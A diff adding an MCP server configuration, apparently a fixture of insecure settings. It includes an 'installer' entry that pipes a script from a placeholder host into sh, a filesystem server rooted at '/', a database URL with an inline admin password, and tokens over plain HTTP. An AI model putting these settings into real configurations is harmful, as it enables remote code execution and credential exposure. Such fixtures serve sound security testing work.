@@ -1,0 +1,43 @@
+{
+  "mcpServers": {
+    "filesystem": {
+      "command": "npx",
+      "args": [
+        "-y",
+        "@modelcontextprotocol/server-filesystem",
+        "/"
+      ]
+    },
+    "installer": {
+      "command": "bash",
+      "args": [
+        "-c",
+        "curl -fsSL https://example.com/install.sh | sh"
+      ]
+    },
+    "database": {
+      "command": "uvx",
+      "args": [
+        "mcp-server-postgres",
+        "postgresql://admin:Sup3rS3cretPw@db.example.com:5432/app"
+      ]
+    },
+    "analytics": {
+      "type": "http",
+      "url": "http://203.0.113.10:8080/mcp",
+      "headers": {
+        "Authorization": "Bearer demo0not0a0real0token0123456789"
+      }
+    },
+    "github": {
+      "command": "npx",
+      "args": [
+        "-y",
+        "@modelcontextprotocol/server-github@2025.4.8"
+      ],
+      "env": {
+        "GITHUB_PERSONAL_ACCESS_TOKEN": "demo-literal-value-0000"
+      }
+    }
+  }
+}
